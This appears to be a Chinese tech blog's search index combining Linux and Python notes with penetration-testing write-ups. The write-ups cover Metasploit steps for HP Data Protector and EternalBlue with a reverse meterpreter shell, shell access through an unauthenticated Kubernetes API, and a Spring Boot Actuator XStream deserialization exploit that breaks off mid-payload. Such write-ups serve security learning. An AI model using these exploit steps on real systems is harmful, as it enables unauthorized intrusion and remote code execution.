<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux命令备忘</title>
    <url>/2020/01/03/Linux%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h3 id="Linux命令备忘"><a href="#Linux命令备忘" class="headerlink" title="Linux命令备忘"></a>Linux命令备忘</h3><ol start="0">
<li>xargs占位符<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> aaa |xargs -I &#123;&#125; python3 test.py &#123;&#125; &#123;&#125;.xlsx</span><br></pre></td></tr></table></figure></li>
<li>查看进程启动时间<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo pid,lstart,etime,cmd | grep nginx</span><br></pre></td></tr></table></figure></li>
<li>找出大于500m的文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +500M -print0 |xargs -0 ls -l</span><br></pre></td></tr></table></figure></li>
<li>Debian显示已安装的软件包<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li>批量杀进程<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux |grep hydra |awk <span class="string">&#x27;&#123;printf &quot;%s\n&quot;, $2&#125;&#x27;</span> |xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure></li>
<li>apt-get配置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.137.1:1080</span><br></pre></td></tr></table></figure></li>
<li>wget设置代理<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2rc1.tgz -e <span class="string">&#x27;https_proxy=http://192.168.137.1:1080&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Debian设置SSH自启动<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d  ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></li>
<li>Kali设置阿里云源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">修改/etc/apt/sources.list文件为以下内容：</span><br><span class="line">deb https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali/ kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li>
<li>查找重复行并统计出现次数，例：统计各IP出现次数 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ip.txt |grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][ 0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span>  |sort |uniq -c &gt; ipncount.txt</span><br></pre></td></tr></table></figure>




</li>
</ol>
<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HP Data Protector漏洞利用记录</title>
    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
<a id="more"></a>
<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
<li>升级Data Protector到A.06.20 或更高版本</li>
<li>对服务启用加密</li>
<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit利用Eternalblue-Doublepulsar</title>
    <url>/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
<a id="more"></a>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
<p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br></pre></td></tr></table></figure>
<p>安装依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br></pre></td></tr></table></figure>
<p>创建<code>.wine/drive_c</code>目录，这里不创建的话后面<code>msf</code>利用漏洞时会出现目录不存在错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /root/.wine/drive_c</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动<code>msfconsole</code>，如果你已经启动了，可以使用<code>reload_all</code>重新加载<code>msf</code>模块来引入刚下载的模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes Api Server 未授权访问漏洞GetShell</title>
    <url>/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="下载kubectl客户端"><a href="#下载kubectl客户端" class="headerlink" title="下载kubectl客户端"></a>下载kubectl客户端</h3><p>参考<a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl-on-windows">官方文档</a><br>因为官方从Google下载，国内下载可能比较困难，这里提供一个Windows版本的kubectl客户端（<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/kubectl.exe/kubectl.exe">下载地址</a>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MD5:eb9039d1285045b48313766aebf3558e *kubectl.exe</span><br></pre></td></tr></table></figure>
<h3 id="获取容器shell"><a href="#获取容器shell" class="headerlink" title="获取容器shell"></a>获取容器shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kubtctl.exe -s ip:port get pods</span><br><span class="line">kubectl.exe -s ip:port --namespace&#x3D;default exec -it &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/05/Kubernetes-Api-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EGetShell/2020-08-20-16-56-00.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://moyu.life/post/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">Kubernetes Api Server 未授权访问漏洞</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Python常用代码备忘</title>
    <url>/2019/09/16/Python%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h3 id="Python常用代码备忘"><a href="#Python常用代码备忘" class="headerlink" title="Python常用代码备忘"></a>Python常用代码备忘</h3><ol start="0">
<li><p>使用清华pip源安装软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install jupyter  -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></li>
<li><p>去除HTTP协议头，<code>http://baidu.com</code>-&gt;<code>baidu.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">domain = re.sub(<span class="string">&#x27;https?://&#x27;</span>, <span class="string">&#x27;&#x27;</span>, domain, flags=re.IGNORECASE)</span><br></pre></td></tr></table></figure></li>
<li><p>把字符串内多个空格合并成一个空格，<code>&#39;　　　&#39;</code>-&gt;<code>&#39; &#39;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li><p>超大文件读取, 超大文件读取使用fileinput，会逐行读取，而readlines会一次读完导致内存爆炸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># def read_ip_history_file(filename):</span></span><br><span class="line"><span class="comment">#     with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         for line in f.readlines():</span></span><br><span class="line"><span class="comment">#             line = line.strip()</span></span><br><span class="line"><span class="comment">#             yield line</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fileinput.input([filename], openhook = fileinput.hook_encoded(<span class="string">&quot;utf-8&quot;</span>)):</span><br><span class="line">        <span class="keyword">yield</span> line</span><br><span class="line"> <span class="comment"># 或者</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">     <span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">             line = line.strip()</span><br><span class="line">             <span class="keyword">yield</span> line</span><br></pre></td></tr></table></figure>
</li>
<li><p>日期转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化为日期对象</span></span><br><span class="line">mail_date = <span class="string">&#x27;2019-09-29 04:55:46&#x27;</span></span><br><span class="line">strdate = datetime.datetime.strptime(mail_date, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"><span class="comment"># 日期对象格式化为字符串对象</span></span><br><span class="line">strdate.strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>子线程随父线程退出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_flag_task = Thread(target=saveFlag, args=(LOG_FILE_NAME, ))</span><br><span class="line"><span class="comment"># 子线程随父进程退出</span></span><br><span class="line">write_flag_task.setDaemon(<span class="literal">True</span>)</span><br><span class="line">write_flag_task.start()</span><br></pre></td></tr></table></figure></li>
<li><p>拼接脚本依赖文件的绝对路径。比如：脚本依赖一个数据库文件，未防止他人使用脚本时路径异常读不到数据库，需要拼接路径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DBPATH = <span class="string">&#x27;123.db&#x27;</span></span><br><span class="line">script_path = sys.argv[<span class="number">0</span>]</span><br><span class="line">abs_script_dir, _ = os.path.split(os.path.abspath(script_path))</span><br><span class="line">DBPATH = os.path.join(abs_script_dir, DBPATH)</span><br></pre></td></tr></table></figure></li>
<li><p>提取中文的正则表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;123你好a&#x27;</span></span><br><span class="line">re.findall(<span class="string">&#x27;[\u4e00-\u9fa5]+&#x27;</span>, s)</span><br><span class="line">输出：[<span class="string">&#x27;你好&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>openpyxl 修改Excel的字体样式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_wb = Workbook()</span><br><span class="line">main_sheet = main_wb.active</span><br><span class="line"><span class="comment"># 添加Excel首行标题</span></span><br><span class="line">main_sheet.append(</span><br><span class="line">    <span class="string">&#x27;站点URL,站点IP,漏洞名称,漏洞风险值,风险等级,CVE编号,详细描述,解决办法,存在漏洞链接,漏洞验证参数&#x27;</span>.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"><span class="comment"># 定义标题字体格式</span></span><br><span class="line">t_font = Font(name=<span class="string">&#x27;宋体&#x27;</span>, size=<span class="number">12</span>, bold=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> main_sheet.rows:</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        cell.font = t_font</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
<li><p>openpyxl删除行：<br>删除第三行之后的两行，行号从1开始算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sheet.delete_rows(<span class="number">3</span>, <span class="number">2</span>) </span><br></pre></td></tr></table></figure>
<p>删除第一列之后的两列，列号从1开始算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wk_sheet.delete_cols(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python读取Excel合并单元格</title>
    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img data-src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-12-27.png"></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>Python 3</li>
<li>xlrd==1.2.0</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img data-src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line">print(mc)</span><br></pre></td></tr></table></figure>
<p>结果输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> range(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> range(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> range(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> range(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        print(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Actuators未授权GetShell</title>
    <url>/2020/06/05/Spring-Boot-Actuators%E6%9C%AA%E6%8E%88%E6%9D%83GetShell/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：  </p>
<a id="more"></a>

<table>
<thead>
<tr>
<th>Http 方法</th>
<th>路径</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>get</td>
<td>/autoconfig</td>
<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</td>
</tr>
<tr>
<td>get</td>
<td>/configprops</td>
<td>描述配置属性（包含默认值）如何注入 Bean</td>
</tr>
<tr>
<td>get</td>
<td>/beans</td>
<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td>get</td>
<td>/dump</td>
<td>获取线程活动的快照</td>
</tr>
<tr>
<td>get</td>
<td>/env</td>
<td>获取全部环境属性</td>
</tr>
<tr>
<td>get</td>
<td>/env/{name}</td>
<td>根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td>get</td>
<td>/health</td>
<td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
</tr>
<tr>
<td>get</td>
<td>/info</td>
<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td>get</td>
<td>/mappings</td>
<td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
</tr>
<tr>
<td>get</td>
<td>/metrics</td>
<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td>get</td>
<td>/metrics/{name}</td>
<td>报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td>post</td>
<td>/shutdown</td>
<td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
</tr>
<tr>
<td>get</td>
<td>/trace</td>
<td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
</tr>
</tbody></table>
<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>访问web应用的<code>/actuator/env</code>或<code>/env</code>，如果有返回json格式的数据则可能存在漏洞。</p>
<h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, defaults=&#123;&#x27;path&#x27;: &#x27;&#x27;&#125;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/&lt;path:path&gt;&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    